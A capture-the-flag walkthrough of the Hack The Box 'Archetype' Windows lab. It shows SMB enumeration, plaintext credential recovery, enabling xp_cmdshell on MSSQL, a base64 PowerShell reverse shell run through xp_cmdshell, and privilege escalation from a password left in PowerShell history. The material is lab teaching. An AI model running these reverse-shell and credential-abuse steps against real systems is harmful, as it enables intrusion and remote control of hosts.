---
title: 'HTB Archetype Walkthrough'
description: 'A comprehensive guide to compromising the Archetype machine on Hack The Box, covering SMB misconfigurations, MSSQL exploitation via xp_cmdshell, and PowerShell history-based privilege escalation.'
date: 2026-06-23
difficulty: Very Easy
os: Windows
authors:
  name: Bilash J. Shahi
  title: Cybersecurity Professional
  picture: https://avatars.githubusercontent.com/elodvk
  url: https://purplesec.org
tags:
  - Hack The Box
  - HTB
  - Very Easy
  - Windows
  - Walkthrough
image: assets/Archetype/Archetype_banner.png
---

# 🛡️ HTB Archetype Walkthrough

**Archetype** is a "Very Easy" Windows machine on Hack The Box that serves as an excellent introduction to enterprise network misconfigurations. The path to root involves enumerating exposed SMB shares to extract database credentials, using those credentials to interact with a Microsoft SQL Server (MSSQL), enabling command execution via `xp_cmdshell`, and finally escalating privileges by recovering an Administrator password left behind in PowerShell history.

!!! info "Machine Information"
    | Attribute | Details |
    | :--- | :--- |
    | **Name** | Archetype |
    | **OS** | Windows |
    | **Difficulty** | Very Easy |
    | **IP Address** | 10.129.21.28 |
    | **Platform** | Hack The Box |

---

## 1. Enumeration

As always, we begin by mapping the attack surface using Nmap. We will scan all TCP ports (`-p-`), run default scripts (`-sC`), and attempt version detection (`-sV`).

```shell title="Nmap Scan"
nmap -sC -sV -T4 -p- -oA reports/Archetype_ 10.129.21.28
```

```plaintext title="Nmap Scan Output"
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-06-22T10:48:58
|_Not valid after:  2056-06-22T10:48:58
| ms-sql-ntlm-info: 
|   10.129.21.28:1433: 
|     Target_Name: ARCHETYPE
|     NetBIOS_Domain_Name: ARCHETYPE
|     NetBIOS_Computer_Name: ARCHETYPE
|     DNS_Domain_Name: Archetype
|     DNS_Computer_Name: Archetype
|_    Product_Version: 10.0.17763
|_ssl-date: 2026-06-22T11:03:32+00:00; 0s from scanner time.
| ms-sql-info: 
|   10.129.21.28:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
... (RPC Ports Omitted) ...
```

### Initial Analysis

The Nmap output reveals several key services:

*   **Port 445 (SMB):** The system is a Windows Server 2019 Standard machine. SMB is highly lucrative for initial enumeration.
*   **Port 1433 (MSSQL):** Microsoft SQL Server 2017 is running. If we find credentials, we might be able to execute commands on the host system.
*   **Port 5985 (WinRM):** Windows Remote Management is active. If we recover administrative credentials, this will provide us with a remote shell.

---

## 2. SMB Enumeration

We start by poking at the SMB service to see if anonymous or guest logins are permitted. We can use `netexec` (formerly crackmapexec) to quickly verify this.

```shell title="Checking Guest Access"
netexec smb 10.129.21.28 -u guest -p ''
```

```text title="Netexec Output"
SMB         10.129.21.28   445    ARCHETYPE        [*] Windows Server 2019 Standard 17763 x64 (name:ARCHETYPE) (domain:Archetype) (signing:False) (SMBv1:True) (Null Auth:True)
SMB         10.129.21.28   445    ARCHETYPE        [+] Archetype\guest:
```

The `[+]` indicates that the `guest` account with a blank password successfully authenticated. Next, we enumerate the available shares.

```shell title="Enumerating Shares"
netexec smb 10.129.21.28 -u guest -p '' --shares
```

```text title="Share Listing"
SMB         10.129.21.28   445    ARCHETYPE        [*] Enumerated shares
SMB         10.129.21.28   445    ARCHETYPE        Share           Permissions     Remark
SMB         10.129.21.28   445    ARCHETYPE        -----           -----------     ------
SMB         10.129.21.28   445    ARCHETYPE        ADMIN$                          Remote Admin
SMB         10.129.21.28   445    ARCHETYPE        backups         READ            
SMB         10.129.21.28   445    ARCHETYPE        C$                              Default share
SMB         10.129.21.28   445    ARCHETYPE        IPC$            READ            Remote IPC
```

We have `READ` access to a non-standard share named `backups`. Let's connect to it using `smbclient` to explore its contents.

```shell title="Connecting to Backups"
smbclient '//10.129.21.28/backups' -U guest%
```

```text title="Extracting Data"
smb: \> ls
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020

		5056511 blocks of size 4096. 2611345 blocks available
smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)
```

We successfully retrieved a file named `prod.dtsConfig`. 

!!! note
    A `.dtsConfig` file is an XML-based configuration file used in SQL Server Integration Services (SSIS). Administrators use it to dynamically update package properties at runtime, such as database connection strings, without recompiling the `.dtsx` package.

Upon inspecting the file locally, we discover plain-text database credentials!

```xml title="prod.dtsConfig"
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

**Recovered Credentials:** `ARCHETYPE\sql_svc` : `M3g4c0rp123`

---

## 3. Initial Access (MSSQL Exploitation)

We can verify if these credentials allow us to log directly into the MSSQL instance running on port 1433.

```shell title="Validating MSSQL Credentials"
netexec mssql 10.129.21.28 -u sql_svc -p 'M3g4c0rp123'
```

```text
MSSQL       10.129.21.28   1433   ARCHETYPE        [*] Windows 10 / Server 2019 Build 17763 (name:ARCHETYPE) (domain:Archetype) (EncryptionReq:False)
MSSQL       10.129.21.28   1433   ARCHETYPE        [+] Archetype\sql_svc:M3g4c0rp123 (Pwn3d!)
```

The `(Pwn3d!)` flag confirms we have access. We will use `impacket-mssqlclient` to establish an interactive SQL session. Since we are logging in as a local Windows account, we use the `-windows-auth` flag.

```shell title="Interactive MSSQL Session"
impacket-mssqlclient Archetype/sql_svc:M3g4c0rp123@10.129.21.28 -windows-auth
```

Once connected, our primary goal is to achieve remote code execution (RCE). In MSSQL, this is typically done using the `xp_cmdshell` stored procedure, which allows the execution of operating system commands.

```text title="Attempting RCE"
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell whoami
ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. 
```

As expected on modern installations, `xp_cmdshell` is disabled by default. Fortunately, since we have sufficient privileges, we can manually re-enable it. Impacket provides a built-in macro `enable_xp_cmdshell` for this exact scenario.

```text title="Enabling xp_cmdshell"
SQL (ARCHETYPE\sql_svc  dbo@master)> enable_xp_cmdshell
INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

With `xp_cmdshell` active, we can generate a PowerShell reverse shell payload using a tool like [revshells.com](https://www.revshells.com/) and execute it via the database connection.

```sql title="Executing the Reverse Shell"
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA0ADAAIgAsADQANAA0ADQAKQA7...[TRUNCATED]...
```

Catching the connection on our local netcat listener provides us with a shell as the `sql_svc` user, allowing us to read the user flag.

```bash title="Reading user.txt"
C:\> type C:\Users\sql_svc\desktop\user.txt
```

---

## 4. Privilege Escalation

Now that we have a foothold, we need to escalate our privileges to `Administrator`. We start by enumerating the system for sensitive files, misconfigurations, and stored credentials. 

A critical check on modern Windows systems is the PowerShell ConsoleHost History file. If an administrator executed commands containing passwords or sensitive information, it might be logged here.

```powershell title="Checking PowerShell History"
cat (Get-PSReadLineOption).HistorySavePath
# Alternative manual path: type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

```plaintext title="Leaked Credentials"
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exi
```

The history file reveals that an administrator previously mapped the `backups` network drive and passed their credentials in plain text!

**Recovered Credentials:** `administrator` : `MEGACORP_4dm1n!!`

We can quickly validate these credentials against the SMB service to ensure they are valid and belong to a local administrator (indicated by `Pwn3d!`).

```shell title="Validating Admin Credentials"
netexec smb 10.129.21.28 -u administrator -p 'MEGACORP_4dm1n!!' --local-auth
```

```text
SMB         10.129.21.28    445    ARCHETYPE        [*] Windows Server 2019 Standard 17763 x64 (name:ARCHETYPE) (domain:ARCHETYPE) (signing:False) (SMBv1:True) (Null Auth:True)
SMB         10.129.21.28    445    ARCHETYPE        [+] ARCHETYPE\administrator:MEGACORP_4dm1n!! (Pwn3d!)
```

Since WinRM (Port 5985) is open, we can use `evil-winrm` to obtain a stable, high-privileged administrative shell over the network.

```shell title="Obtaining Root Access"
evil-winrm -i 10.129.21.28 -u administrator -p 'MEGACORP_4dm1n!!'
```

We are now the `Administrator` and can retrieve the final flag.

```powershell title="Reading root.txt"
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
```

**Machine Pwned!** 🚩
